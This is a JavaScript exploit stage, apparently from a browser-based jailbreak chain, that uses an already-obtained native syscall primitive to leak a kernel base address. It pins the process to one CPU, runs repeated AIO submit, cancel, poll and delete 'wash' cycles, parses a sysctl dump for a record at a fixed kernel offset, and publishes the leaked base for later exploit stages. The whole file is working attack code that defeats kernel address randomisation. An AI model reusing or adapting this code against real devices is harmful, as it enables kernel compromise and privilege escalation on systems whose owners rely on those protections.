// v2 = v1 plus window.__fw14KbaseLo publication so later stages do not have
// to hardcode a per-boot base.
// Port of Hx1400 Stage A's kbase leak to the browser native caller.
//
// Hx1400 builds five 40-byte AIO headers (zero length, fd -1), submits them
// with 669 command 0x1001 and priority 3, then runs 666 cancel -> 664 poll ->
// 662 delete until the delete results clear. It repeats this "wash" for 32
// cycles, calls sysctl mib {4,17,0,28,1,0}, and looks for a record whose
// qword at +32 equals kbase + 0x798754. Up to 12 segments of 32 cycles.
//
// This probe runs at most 4 segments (128 cycles) and stops on the first
// candidate. It pins the process to one CPU first (which=2 + explicit PID,
// the only shape that worked in the Phase 2 census) and restores the mask.
// Every frame byte in 0x200..0x901f is restored and any surviving request
// IDs are deleted before return.
var result, n, f, dv, saved, phase = "preflight";
var pinnedMask = 0, pinnedMaskHi = 0, didPin = false;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !Number.isSafeInteger(n.frameAddress) ||
      typeof n.wrappers.sys669 !== "number" ||
      typeof n.wrappers.sys666 !== "number" ||
      typeof n.wrappers.sys664 !== "number" ||
      typeof n.wrappers.sys662 !== "number" ||
      typeof n.wrappers.sys487 !== "number" ||
      typeof n.wrappers.sys488 !== "number" ||
      typeof n.wrappers.sysctl !== "number" ||
      !state || state.array[0] !== state.a)
    throw new Error("caller_missing");
  f = n.frame;
  if (f.length < 0x10000) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x9020));

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }
  function zero(off, len) { f.fill(0, off, off + len); }

  // ------------------------------------------------------------- pin
  phase = "pin";
  mark("kbase_pin");
  var pinTag = "skip";
  dv.setUint32(0x600, 0, true);
  dv.setUint32(0x604, 0, true);
  var g = n.call("sys487", [3, 2, pid, 16, n.frameAddress + 0x600]);
  if (!isErr(g) && g.value === 0) {
    pinnedMask = dv.getUint32(0x600, true);
    pinnedMaskHi = dv.getUint32(0x604, true);
    var bit = -1;
    for (var b = 0; b < 32; b++)
      if ((pinnedMask & (1 << b)) !== 0) { bit = b; break; }
    if (bit >= 0) {
      dv.setUint32(0x620, 1 << bit, true);
      dv.setUint32(0x624, 0, true);
      var sres = n.call("sys488", [3, 2, pid, 16, n.frameAddress + 0x620]);
      dv.setUint32(0x640, 0, true);
      dv.setUint32(0x644, 0, true);
      n.call("sys487", [3, 2, pid, 16, n.frameAddress + 0x640]);
      didPin = !isErr(sres) && sres.value === 0 &&
        dv.getUint32(0x640, true) === (1 << bit) &&
        dv.getUint32(0x644, true) === 0;
      pinTag = "0x" + (pinnedMaskHi ? pinnedMaskHi.toString(16) : "") +
        ("00000000" + pinnedMask.toString(16)).slice(-8) +
        "/b" + bit + (didPin ? "/ok" : "/fail");
    } else {
      pinTag = "nomask";
    }
  } else {
    pinTag = "e" + (isErr(g) ? n.readErrno() : g.value);
  }

  // ----------------------------------------------------------- wash
  // Five zeroed 40-byte headers with fd -1 at +32.
  zero(0x400, 5 * 40);
  for (var hi = 0; hi < 5; hi++)
    dv.setInt32(0x400 + hi * 40 + 32, -1, true);

  function washCycle() {
    zero(0x500, 20);
    var sub = n.call("sys669",
      [0x1001, n.frameAddress + 0x400, 5, 3, n.frameAddress + 0x500, 0]);
    if (isErr(sub) || sub.value !== 0) return "sub" + (isErr(sub) ? n.readErrno() : sub.value);
    for (var z = 0; z < 5; z++)
      if (dv.getUint32(0x500 + z * 4, true) === 0) return "zero-id";
    zero(0x520, 20);
    n.call("sys666", [n.frameAddress + 0x500, 5, n.frameAddress + 0x520, 0, 0, 0]);
    var left = 0;
    for (var round = 0; round < 4; round++) {
      zero(0x540, 20);
      n.call("sys664", [n.frameAddress + 0x500, 5, n.frameAddress + 0x540, 0, 0, 0]);
      zero(0x560, 20);
      n.call("sys662", [n.frameAddress + 0x500, 5, n.frameAddress + 0x560, 0, 0, 0]);
      left = 0;
      for (var j = 0; j < 5; j++)
        if (dv.getUint32(0x560 + j * 4, true) !== 0) left++;
      if (left === 0) break;
    }
    return left === 0 ? "ok" : "stuck" + left;
  }

  phase = "wash";
  mark("kbase_wash");
  var cycles = 0, stuck = 0, segments = 0, stop = "";
  var size = 0, recs = 0, cands = 0, baseLo = 0, mixed = false;
  var recSummary = "";
  for (var seg = 0; seg < 4 && cands === 0 && stop === ""; seg++) {
    segments++;
    for (var c = 0; c < 32; c++) {
      var st = washCycle();
      cycles++;
      if (st === "ok") continue;
      if (st === "stuck" || st.indexOf("stuck") === 0) { stuck++; continue; }
      stop = st;
      break;
    }
    if (stop !== "") break;

    // --------------------------------------------------- sysctl parse
    phase = "sysctl";
    mark("kbase_sysctl");
    dv.setUint32(0x300, 4, true);
    dv.setUint32(0x304, 17, true);
    dv.setUint32(0x308, 0, true);
    dv.setUint32(0x30c, 28, true);
    dv.setUint32(0x310, 1, true);
    dv.setUint32(0x314, 0, true);
    dv.setUint32(0x200, 32768, true);
    dv.setUint32(0x204, 0, true);
    var sc = n.call("sysctl", [n.frameAddress + 0x300, 6,
      n.frameAddress + 0x1000, n.frameAddress + 0x200, 0, 0]);
    if (isErr(sc) || sc.value !== 0) {
      stop = "sysctl" + (isErr(sc) ? n.readErrno() : sc.value);
      break;
    }
    size = dv.getUint32(0x200, true);
    recs = 0;
    var cursor = 0, parts = [];
    var ANCHOR_LO = 0x798754;
    while (cursor + 16 <= size && cursor + 16 <= 32768) {
      var rlen = dv.getUint16(0x1000 + cursor, true);
      if (rlen < 16 || cursor + rlen > size) break;
      recs++;
      var type = f[0x1000 + cursor + 3] & 0xff;
      if (parts.length < 10) {
        var piece = "t" + type + "/" + rlen;
        if (rlen >= 40) {
          var lo0 = dv.getUint32(0x1000 + cursor + 32, true);
          var hi0 = dv.getUint32(0x1000 + cursor + 36, true);
          piece += ":0x" + (hi0 >>> 0).toString(16) +
            ("00000000" + (lo0 >>> 0).toString(16)).slice(-8);
        }
        parts.push(piece);
      }
      if (type === 4 && rlen >= 40) {
        var lo = dv.getUint32(0x1000 + cursor + 32, true);
        var hi = dv.getUint32(0x1000 + cursor + 36, true);
        if (hi === 0xffffffff && lo !== 0 && lo !== 0xffffffff &&
            lo >= ANCHOR_LO && ((lo - ANCHOR_LO) % 0x4000) === 0) {
          var candLo = lo - ANCHOR_LO;
          if (cands === 0) baseLo = candLo;
          else if (baseLo !== candLo) mixed = true;
          cands++;
        }
      }
      cursor += rlen;
    }
    recSummary = parts.join(",");
    if (recSummary.length > 512) recSummary = recSummary.slice(0, 512);
  }

  // ------------------------------------------------------- cleanup
  phase = "cleanup";
  // Delete any IDs left by the last submit.
  zero(0x560, 20);
  n.call("sys662", [n.frameAddress + 0x500, 5, n.frameAddress + 0x560, 0, 0, 0]);
  if (didPin) {
    dv.setUint32(0x600, pinnedMask, true);
    dv.setUint32(0x604, pinnedMaskHi, true);
    n.call("sys488", [3, 2, pid, 16, n.frameAddress + 0x600]);
  }
  for (var i = 0; i < saved.length; i++) f[0x200 + i] = saved[i];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a;

  if (cands > 0 && !mixed) window.__fw14KbaseLo = baseLo;
  var sysTag = "ok/size=" + size + "/recs=" + recs +
    "/cands=" + cands + (mixed ? "/mixed" : "");
  if (cands > 0 && !mixed)
    sysTag += "/base=0xffffffff" +
      ("00000000" + baseLo.toString(16)).slice(-8);
  result = {
    id: "kbase_wash_v2",
    status: intact ? "pass" : "fail",
    details: {
      pid: pid,
      pin: pinTag,
      wash: "seg" + segments + "/cyc" + cycles + "/stuck" + stuck +
        (stop ? "/stop=" + stop : ""),
      sysctl: sysTag,
      recs: recSummary,
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "kbase_wash_v2",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 200) }
  };
} finally {
  try {
    if (n) {
      zero(0x560, 20);
      n.call("sys662", [n.frameAddress + 0x500, 5, n.frameAddress + 0x560, 0, 0, 0]);
      if (didPin) {
        dv.setUint32(0x600, pinnedMask, true);
        dv.setUint32(0x604, pinnedMaskHi, true);
        n.call("sys488", [3, 2, pid, 16, n.frameAddress + 0x600]);
      }
    }
  } catch (ignore) {}
  if (f && saved)
    for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
}
return [result];
